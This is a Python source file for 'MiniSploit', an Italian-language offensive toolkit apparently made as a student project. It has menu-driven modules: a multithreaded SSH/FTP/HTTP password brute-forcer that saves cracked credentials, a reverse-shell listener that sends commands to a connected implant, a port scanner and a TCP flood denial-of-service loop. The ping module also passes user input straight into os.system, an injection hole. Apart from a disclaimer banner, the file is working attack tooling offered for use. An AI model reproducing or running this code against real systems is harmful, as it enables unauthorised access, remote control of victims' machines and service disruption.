#!/usr/bin/env python3
import time
import readline
import sys
import subprocess
import socket
import os
import random
import threading
import concurrent.futures
import cmd
import queue
import paramiko
from ftplib import FTP
import requests

# Sopprime gli avvisi SSL
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Importazione Colorama
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except ImportError:
    class _Dummy:
        RESET_ALL = ""; RED = ""; GREEN = ""; YELLOW = ""; CYAN = ""; MAGENTA = ""; BLUE = ""
    Fore = Style = _Dummy()

# =========================================================================
# 1. MODULO BRUTE FORCE SHELL (Mantenuto e integrato con cmd.Cmd)
# =========================================================================
class BruteForceShell(cmd.Cmd):
    prompt = f'{Fore.CYAN}(MiniSploit/BruteForce)> {Style.RESET_ALL}'
    intro = (
        f"{Fore.GREEN}Benvenuto nel modulo Brute-Force Didattico!\n"
        f"Digita 'help' o '?' per vedere i comandi disponibili.{Style.RESET_ALL}\n"
    )

    params = {
        "protocol": None, "threads": 10, "user_file": None,
        "pass_file": None, "host": None, "port": None, "url": None,
        "output": None, "verbose": False
    }

    def ftp_worker(self, host, port, user, passwd, output_file=None, verbose=False):
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user, passwd)
            print(f"{Fore.GREEN}[+] FTP SUCCESS {user}:{passwd}{Style.RESET_ALL}")
            if output_file:
                with open(output_file, "a") as f:
                    f.write(f"{host}:{port}:FTP:{user}:{passwd}\n")
            ftp.quit()
        except Exception:
            if verbose:
                print(f"{Fore.RED}[-] FTP FAILED {user}:{passwd}{Style.RESET_ALL}")

    def ssh_worker(self, host, port, user, passwd, output_file=None, verbose=False):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username=user, password=passwd, timeout=10, allow_agent=False, look_for_keys=False)
            print(f"{Fore.GREEN}[+] SSH SUCCESS {user}:{passwd}{Style.RESET_ALL}")
            if output_file:
                with open(output_file, "a") as f:
                    f.write(f"{host}:{port}:SSH:{user}:{passwd}\n")
            client.close()
        except Exception:
            if verbose:
                print(f"{Fore.RED}[-] SSH FAILED {user}:{passwd}{Style.RESET_ALL}")
        finally:
            time.sleep(random.uniform(1.0, 3.0))

    def http_worker(self, login_url, user, passwd, output_file=None, verbose=False):
        s = requests.Session()
        data = {"username": user, "password": passwd, "Login": "Login"}
        try:
            response = s.post(login_url, data=data, verify=False, timeout=8)
            content_lower = response.text.lower()
            if "welcome" in content_lower and "login failed" not in content_lower:
                print(f"{Fore.GREEN}[+] HTTP SUCCESS {user}:{passwd}{Style.RESET_ALL}")
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(f"{login_url}:HTTP:{user}:{passwd}\n")
                return True
            elif verbose:
                print(f"{Fore.RED}[-] HTTP FAILED {user}:{passwd}{Style.RESET_ALL}")
        except Exception:
            pass
        return False

    def run_attack(self, users, passwords):
        proto = self.params["protocol"]
        threads = self.params["threads"]
        output_file = self.params["output"]
        verbose = self.params["verbose"]
        host = self.params["host"]
        port = self.params["port"]
        url = self.params["url"]
        
        combo_queue = queue.Queue()
        for u in users:
            for p in passwords:
                combo_queue.put((u, p))
                
        total_attempts = combo_queue.qsize()

        def worker():
            while True:
                try:
                    u, p = combo_queue.get(timeout=3)
                except queue.Empty:
                    return
                if proto == "ftp":
                    self.ftp_worker(host, port if port else 21, u, p, output_file, verbose)
                elif proto == "ssh":
                    self.ssh_worker(host, port if port else 22, u, p, output_file, verbose)
                elif proto == "http":
                    self.http_worker(url, u, p, output_file, verbose)
                combo_queue.task_done()

        print(f"{Fore.YELLOW}[INFO] Avvio di {threads} thread per {proto.upper()} ({total_attempts} tentativi)...{Style.RESET_ALL}")
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
        combo_queue.join()
        print(f"{Fore.MAGENTA}[DONE] Attacco {proto.upper()} completato.{Style.RESET_ALL}")

    def do_exit(self, arg):
        """Esce dal modulo e torna al menu principale."""
        print(f"{Fore.GREEN}Ritorno al menu principale.{Style.RESET_ALL}")
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

    def do_use(self, line):
        """Seleziona il protocollo (Esempio: use ssh / use ftp / use http)"""
        protocol = line.strip().lower()
        if protocol in ["ssh", "ftp", "http"]:
            self.params["protocol"] = protocol
            if protocol == "ssh": self.params["port"] = 22
            elif protocol == "ftp": self.params["port"] = 21
            print(f"{Fore.GREEN}Protocollo selezionato: {protocol.upper()}{Style.RESET_ALL}")
            self.prompt = f'{Fore.CYAN}(MiniSploit/{protocol.upper()})> {Style.RESET_ALL}'
        else:
            print(f"{Fore.RED}[-] Protocollo non valido. Usa: ssh, ftp, http.{Style.RESET_ALL}")
            
    def do_set(self, line):
        """Imposta un parametro (Esempio: set host 192.168.1.10 o set threads 20)"""
        try:
            param, value = line.split(maxsplit=1)
            param = param.lower()
            if param == "verbose":
                self.params[param] = value.lower() in ('true', '1', 't', 'y', 'on')
            elif param in ["threads", "port"]:
                self.params[param] = int(value)
            elif param in self.params:
                self.params[param] = value
            else:
                print(f"{Fore.RED}[-] Parametro '{param}' non riconosciuto.{Style.RESET_ALL}")
                return
            print(f"{Fore.GREEN}[+] Impostato {param} = {self.params[param]}{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[-] Formato errato. Usa: set <parametro> <valore>{Style.RESET_ALL}")

    def do_show(self, arg):
        """Mostra i parametri e le opzioni correnti configurate."""
        print(f"\n{Fore.YELLOW}=== PARAMETRI CORRENTI BRUTE-FORCE ===")
        for key, value in self.params.items():
            print(f"  {key:<12}: {Fore.BLUE}{value}{Style.RESET_ALL}")
        print("======================================\n")
        
    def do_run(self, arg):
        """Avvia l'attacco di forza bruta con i parametri impostati."""
        if not self.params["protocol"]:
            print(f"{Fore.RED}[-] Seleziona prima un protocollo con 'use [protocollo]'.{Style.RESET_ALL}")
            return
        if not self.params["user_file"] or not self.params["pass_file"]:
            print(f"{Fore.RED}[-] Specifica user_file e pass_file (es. set user_file users.txt).{Style.RESET_ALL}")
            return
        try:
            with open(self.params["user_file"], "r", encoding='latin-1', errors='ignore') as f:
                users = [l.strip() for l in f if l.strip()]
            with open(self.params["pass_file"], "r", encoding='latin-1', errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
        except FileNotFoundError as e:
            print(f"{Fore.RED}[-] File non trovato: {e}{Style.RESET_ALL}")
            return
        self.run_attack(users, passwords)


# =========================================================================
# 2. SOTTOMENU OPERATIVI CON COMANDO HELP INTEGRATO
# =========================================================================

def listener_cli():
    host = '0.0.0.0'
    port = 4444
    EOP_MARKER = b"<EOF>"
    print(f"\n{Fore.CYAN}[INFO] Modulo Listener Avviato. Digita 'help' per la guida.{Style.RESET_ALL}")
    
    while True:
        cmd_in = input(f"{Fore.GREEN}(MiniSploit/Listener)> {Style.RESET_ALL}").strip()
        if not cmd_in: continue
        parts = cmd_in.split()
        command = parts[0].lower()

        if command == 'lhost' and len(parts) == 2:
            host = parts[1]
            print(f"{Fore.GREEN}[+] LHOST impostato a => {host}{Style.RESET_ALL}")
        elif command == 'lport' and len(parts) == 2:
            port = int(parts[1])
            print(f"{Fore.GREEN}[+] LPORT impostato a => {port}{Style.RESET_ALL}")
        elif command == 'options':
            print(f"\n{Fore.YELLOW}--- OPZIONI LISTENER ---")
            print(f"  LHOST = {host}")
            print(f"  LPORT = {port}")
            print(f"------------------------\n")
        elif command == 'help':
            print(f"""
{Fore.CYAN}GUIDA COMANDI LISTENER:
  - lhost <ip>    : Imposta l'IP di ascolto (es. lhost 0.0.0.0)
  - lport <porta> : Imposta la porta di ascolto (es. lport 4444)
  - options       : Mostra le impostazioni correnti
  - run / start   : Avvia l'ascolto della reverse shell
  - exit          : Torna al menu principale
[*] Prima di avviare il listener assicurati di usare lo stesso marcatore sia nel malware che nel listener devono essere uguali.
  - markatore     : Mostra il marcatore usato dal listener{Style.RESET_ALL}
""")

        elif command == "markatore":
            print(f"Markatore usato: <EOF>")
            
        elif command in ['run', 'start']:
            print(f"{Fore.YELLOW}[*] In ascolto su {host}:{port}... Premi Ctrl+C per uscire. MARCATORE <EOF>{Style.RESET_ALL}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.bind((host, port))
                s.listen(1)
                conn, addr = s.accept()
                print(f"{Fore.GREEN}[+] Connessione stabilita da {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                while True:
                    c = input(f"{Fore.CYAN}shell$ {Style.RESET_ALL}")
                    if c.lower() == 'exit':
                        conn.sendall(b"exit\n")
                        break
                    if not c.strip(): continue
                    conn.sendall(c.encode('utf-8'))
                    data = b""
                    while EOP_MARKER not in data:
                        chunk = conn.recv(4096)
                        if not chunk: break
                        data += chunk
                    print(data.replace(EOP_MARKER, b"").decode('utf-8', errors='ignore'))
            except Exception as e:
                print(f"{Fore.RED}[-] Errore socket: {e}{Style.RESET_ALL}")
            finally:
                s.close()
        elif command == 'exit':
            break
        else:
            print(f"{Fore.RED}[-] Comando sconosciuto. Digita 'help' per la lista comandi.{Style.RESET_ALL}")

def port_scanner():
    ip = None
    print(f"\n{Fore.CYAN}[INFO] Modulo Scanner Porte. Digita 'help' per la guida.{Style.RESET_ALL}")
    while True:
        cmd_in = input(f"{Fore.GREEN}(MiniSploit/Scanner)> {Style.RESET_ALL}").strip()
        if not cmd_in: continue
        parts = cmd_in.split()
        command = parts[0].lower()

        if command == 'target' and len(parts) == 2:
            ip = parts[1]
            print(f"{Fore.GREEN}[+] TARGET impostato a => {ip}{Style.RESET_ALL}")
        elif command == 'options':
            print(f"\n{Fore.YELLOW}--- OPZIONI SCANNER ---")
            print(f"  TARGET = {ip}")
            print(f"-----------------------\n")
        elif command == 'help':
            print(f"""
{Fore.CYAN}GUIDA COMANDI SCANNER:
  - target <ip>   : Imposta l'indirizzo IP target (es. target 192.168.1.1)
  - options       : Mostra le impostazioni correnti
  - run           : Avvia la scansione delle porte comuni
  - exit          : Torna al menu principale{Style.RESET_ALL}
""")
        elif command == 'run':
            if not ip:
                print(f"{Fore.RED}[-] Devi prima impostare un target con 'target <ip>'.{Style.RESET_ALL}")
                continue
            print(f"{Fore.YELLOW}[*] Scansione in corso su {ip}...{Style.RESET_ALL}")
            open_ports = []
            def check_port(p):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.4)
                    if sock.connect_ex((ip, p)) == 0:
                        open_ports.append(p)
                        print(f"{Fore.GREEN}[+] Porta aperta trovata: {p}{Style.RESET_ALL}")
                    sock.close()
                except:
                    pass
            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                executor.map(check_port, [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080])
            print(f"{Fore.MAGENTA}[DONE] Scansione completata. Porte aperte: {open_ports}{Style.RESET_ALL}")
        elif command == 'exit':
            break
        else:
            print(f"{Fore.RED}[-] Comando sconosciuto. Digita 'help' per la lista comandi.{Style.RESET_ALL}")

def auxiliary_ping():
    host = None
    print(f"\n{Fore.CYAN}[INFO] Modulo Ping Host. Digita 'help' per la guida.{Style.RESET_ALL}")
    while True:
        cmd_in = input(f"{Fore.GREEN}(MiniSploit/Ping)> {Style.RESET_ALL}").strip()
        if not cmd_in: continue
        parts = cmd_in.split()
        command = parts[0].lower()

        if command == 'host' and len(parts) == 2:
            host = parts[1]
            print(f"{Fore.GREEN}[+] HOST impostato a => {host}{Style.RESET_ALL}")
        elif command == 'options':
            print(f"\n{Fore.YELLOW}--- OPZIONI PING ---")
            print(f"  HOST = {host}")
            print(f"--------------------\n")
        elif command == 'help':
            print(f"""
{Fore.CYAN}GUIDA COMANDI PING:
  - host <ip/dominio> : Imposta l'host da testare (es. host 8.8.8.8)
  - options           : Mostra le impostazioni correnti
  - run               : Esegue il comando di ping
  - exit              : Torna al menu principale{Style.RESET_ALL}
""")
        elif command == 'run':
            if not host:
                print(f"{Fore.RED}[-] Devi prima impostare un host con 'host <ip>'.{Style.RESET_ALL}")
                continue
            print(f"{Fore.YELLOW}[*] Esecuzione ping verso {host}...{Style.RESET_ALL}")
            response = os.system(f"ping -c 3 {host}")
            if response == 0:
                print(f"{Fore.GREEN}[+] L'host è attivo e raggiungibile.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Host non raggiungibile/spento o con FIREWALL per ICMP attivo.{Style.RESET_ALL}")
        elif command == 'exit':
            break
        else:
            print(f"{Fore.RED}[-] Comando sconosciuto. Digita 'help' per la lista comandi.{Style.RESET_ALL}")

def dos_flood():
    target_ip = None
    target_port = None
    print(f"\n{Fore.CYAN}[INFO] Modulo DoS Flood. Digita 'help' per la guida.{Style.RESET_ALL}")
    while True:
        cmd_in = input(f"{Fore.GREEN}(MiniSploit/DoS)> {Style.RESET_ALL}").strip()
        if not cmd_in: continue
        parts = cmd_in.split()
        command = parts[0].lower()

        if command == 'target' and len(parts) == 2:
            target_ip = parts[1]
            print(f"{Fore.GREEN}[+] TARGET impostato a => {target_ip}{Style.RESET_ALL}")
        elif command == 'port' and len(parts) == 2:
            target_port = int(parts[1])
            print(f"{Fore.GREEN}[+] PORT impostato a => {target_port}{Style.RESET_ALL}")
        elif command == 'options':
            print(f"\n{Fore.YELLOW}--- OPZIONI DOS ---")
            print(f"  TARGET = {target_ip}")
            print(f"  PORT   = {target_port}")
            print(f"-------------------\n")
        elif command == 'help':
            print(f"""
{Fore.CYAN}GUIDA COMANDI DOS:
  - target <ip>   : Imposta l'IP della vittima (es. target 127.0.0.1)
  - port <porta>  : Imposta la porta target (es. port 80)
  - options       : Mostra le impostazioni correnti
  - run           : Avvia lo stress test (Premi Ctrl+C per fermare)
  - exit          : Torna al menu principale{Style.RESET_ALL}
""")
        elif command == 'run':
            if not target_ip or not target_port:
                print(f"{Fore.RED}[-] Imposta prima target e port.{Style.RESET_ALL}")
                continue
            try:
                print(f"{Fore.YELLOW}[*] Invio pacchetti di test a {target_ip}:{target_port} (Premi Ctrl+C per fermare){Style.RESET_ALL}")
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target_ip, target_port))
                    s.send(os.urandom(4000))
                    s.close()
                    time.sleep(0.05)
                    print(f"Attacco arrivato a destinazione.")
            except KeyboardInterrupt:
                print(f"\n{Fore.GREEN}[+] Test interrotto dall'utente.{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Errore: {e}{Style.RESET_ALL}")
        elif command == 'exit':
            break
        else:
            print(f"{Fore.RED}[-] Comando sconosciuto. Digita 'help' per la lista comandi.{Style.RESET_ALL}")


# =========================================================================
# 3. MENU PRINCIPALE
# =========================================================================
def main_menu():
    banner = f"""
{Fore.BLUE}╔════════════════════════════════════════════════════════════════════╗            
║                           MINISPLOIT                               ║
║           Created by Manu/Paty/Bone/Cry     -      Versione 2.0    ║
╚════════════════════════════════════════════════════════════════════╝
- Use this script for educational purposes only; the creator assumes no responsibility for any damage caused - 

{Style.RESET_ALL}
    """
    print(banner)
    
    while True:
        print(f"\n{Fore.YELLOW}MODULI DISPONIBILI (Digita 'help' per la guida generale):{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} use listener    - Reverse Shell / C2")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} use brute       - Attack Brute-Force (SSH, FTP, HTTP)")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} use scanner     - Scansione rapida porte aperte")
        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} use ping        - Verify state host (Ping)")
        print(f"  {Fore.GREEN}5.{Style.RESET_ALL} use dos         - Stress test network (TCP Flood)\n")
        
        try:
            cmd2 = input(f"{Fore.CYAN}(MiniSploit)> {Style.RESET_ALL}").strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.GREEN}Uscita in corso. A presto!{Style.RESET_ALL}")
            break

        if cmd2.startswith("use "):
            modulo = cmd2.split()[1].lower()
            if modulo == "listener":
                listener_cli()
            elif modulo == "brute":
                try:
                    BruteForceShell().cmdloop()
                except KeyboardInterrupt:
                    print(f"\n{Fore.GREEN}Uscita dal modulo Brute-Force.{Style.RESET_ALL}")
            elif modulo == "scanner":
                port_scanner()
            elif modulo == "ping":
                auxiliary_ping()
            elif modulo == "dos":
                dos_flood()
            else:
                print(f"{Fore.RED}[-] Modulo non trovato. Scegli tra: listener, brute, scanner, ping, dos.{Style.RESET_ALL}")
        elif cmd2 == "clear":
            os.system("clear")
        elif cmd2 in ["exit", "quit"]:
            print(f"{Fore.GREEN}Uscita in corso. A presto!{Style.RESET_ALL}")
            break
        elif cmd2 == "help":
            print(f"""
{Fore.CYAN}=============================================================|
GUIDA GENERALE MINISPLOIT:
- use <modulo>  : Entra direttamente in un modulo operativo.
- clear         : Pulisce lo schermo del terminale.
- help          : Mostra questa guida generale.
- exit / quit   : Esce dal programma.

MODULI DISPONIBILI:
- listener      : Ricevi e gestisci connessioni remote (Reverse Shell).
- brute         : Esegui attacchi di dizionario (SSH, FTP, HTTP).
- scanner       : Trova porte aperte su un IP target.
- ping          : Verifica la raggiungibilità di un host.
- dos           : Effettua stress test di rete simulati.
============================================================={Style.RESET_ALL}
""")
        else:
            print(f"{Fore.RED}[-] Comando non valido. Digita 'help' per la guida.{Style.RESET_ALL}")

if __name__ == "__main__":
    main_menu()
